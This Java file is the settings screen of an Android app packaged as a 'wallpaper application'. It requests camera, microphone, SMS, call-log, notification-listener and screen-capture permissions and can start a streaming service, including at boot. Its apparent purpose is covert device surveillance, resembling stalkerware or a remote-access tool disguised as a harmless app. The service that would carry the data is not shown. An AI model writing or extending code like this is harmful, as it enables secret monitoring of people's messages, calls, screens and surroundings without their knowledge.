package com.example.wallpaperapplication;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.Switch;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.preference.PreferenceManager;
import java.util.ArrayList;
import java.util.List;

public class StreamingSettingsActivity extends AppCompatActivity implements Constants {
    private Switch streamingSwitch;
    private Switch bootSwitch;
    private Button stopButton;
    private static final int PERMISSION_REQUEST_CODE = 1;
    private static final int SCREEN_CAPTURE_REQUEST_CODE = 1000;
    private static final int NOTIFICATION_ACCESS_REQUEST_CODE = 1001;
    private BroadcastReceiver permissionErrorReceiver;

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_streaming_settings);

        streamingSwitch = findViewById(R.id.streaming_switch);
        bootSwitch      = findViewById(R.id.switch_boot);
        stopButton      = findViewById(R.id.btn_stop);

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        streamingSwitch.setChecked(prefs.getBoolean("streaming_enabled", false));
        bootSwitch     .setChecked(prefs.getBoolean("boot_streaming_enabled", false));

        streamingSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                if (checkPermissions()) {
                    requestNotificationAccess();
                } else {
                    streamingSwitch.setChecked(false);
                }
            } else {
                stopStreamingService();
                prefs.edit().putBoolean("streaming_enabled", false).apply();
            }
        });

        bootSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            prefs.edit().putBoolean("boot_streaming_enabled", isChecked).apply();
        });

        stopButton.setOnClickListener(v -> {
            stopStreamingService();
            streamingSwitch.setChecked(false);
            prefs.edit().putBoolean("streaming_enabled", false).apply();
        });

        permissionErrorReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                streamingSwitch.setChecked(false);
                Toast.makeText(context, "Streaming failed: Missing permissions", Toast.LENGTH_SHORT).show();
                promptEnablePermissions();
            }
        };

        IntentFilter filter = new IntentFilter("com.example.wallpaperapplication.PERMISSION_ERROR");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // explicitly say this receiver is NOT exported
            registerReceiver(permissionErrorReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(permissionErrorReceiver, filter);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (permissionErrorReceiver != null) {
            unregisterReceiver(permissionErrorReceiver);
            permissionErrorReceiver = null;
        }
    }

    private boolean checkPermissions() {
        List<String> permissions = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.CAMERA);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.RECORD_AUDIO);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                        != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.READ_SMS);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.READ_CALL_LOG);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION)
                != PackageManager.PERMISSION_GRANTED) {
            permissions.add(Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION);
        }
        if (!permissions.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissions.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE
            );
            return false;
        }
        return true;
    }

    private void requestNotificationAccess() {
        if (!isNotificationService()) {
            Toast.makeText(this,
                    "Please enable notification access for full functionality",
                    Toast.LENGTH_LONG
            ).show();
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivityForResult(intent, NOTIFICATION_ACCESS_REQUEST_CODE);
        } else {
            requestScreenCapture();
        }
    }

    private boolean isNotificationService() {
        String pkg = getPackageName();
        String enabled = Settings.Secure.getString(
                getContentResolver(),
                "enabled_notification_listeners"
        );
        return enabled != null && enabled.contains(
                pkg + "/" + NotificationListener.class.getName()
        );
    }

    private void requestScreenCapture() {
        MediaProjectionManager mgr =
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(
                mgr.createScreenCaptureIntent(),
                SCREEN_CAPTURE_REQUEST_CODE
        );
    }

    private void promptEnablePermissions() {
        Toast.makeText(
                this,
                "Please enable required permissions in settings",
                Toast.LENGTH_LONG
        ).show();
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(android.net.Uri.fromParts("package", getPackageName(), null));
        startActivity(intent);
    }

    private void startStreamingService() {
        Intent intent = new Intent(this, StreamingService.class);
        ContextCompat.startForegroundService(this, intent);
    }

    private void stopStreamingService() {
        Intent intent = new Intent(this, StreamingService.class);
        intent.setAction("STOP_STREAMING");
        ContextCompat.startForegroundService(this, intent);
    }

    @Override
    public void onRequestPermissionsResult(
            int requestCode, String[] permissions, int[] grantResults
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int res : grantResults) {
                if (res != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                requestNotificationAccess();
            } else {
                Toast.makeText(this, "Permissions required for streaming", Toast.LENGTH_SHORT).show();
                streamingSwitch.setChecked(false);
                if (
                        !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.CAMERA)  ||
                                !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.RECORD_AUDIO) ||
                                !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)     ||
                                !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_CALL_LOG)||
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                                        !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.POST_NOTIFICATIONS)
                                ) ||
                                !ActivityCompat.shouldShowRequestPermissionRationale(
                                        this,
                                        Manifest.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION
                                )
                ) {
                    promptEnablePermissions();
                }
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Intent intent = new Intent(this, StreamingService.class);
                intent.setAction(ACTION_MEDIA_PROJECTION_RESULT);
                intent.putExtra(EXTRA_RESULT_CODE, resultCode);
                intent.putExtra(EXTRA_RESULT_DATA, data);
                ContextCompat.startForegroundService(this, intent);
                PreferenceManager.getDefaultSharedPreferences(this)
                        .edit().putBoolean("streaming_enabled", true).apply();
                streamingSwitch.setChecked(true);
            } else {
                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show();
                PreferenceManager.getDefaultSharedPreferences(this)
                        .edit().putBoolean("streaming_enabled", false).apply();
                streamingSwitch.setChecked(false);
            }
        } else if (requestCode == NOTIFICATION_ACCESS_REQUEST_CODE) {
            if (isNotificationService()) {
                requestScreenCapture();
            } else {
                Toast.makeText(
                        this,
                        "Notification access not enabled, proceeding anyway",
                        Toast.LENGTH_SHORT
                ).show();
                requestScreenCapture();
            }
        }
    }
}
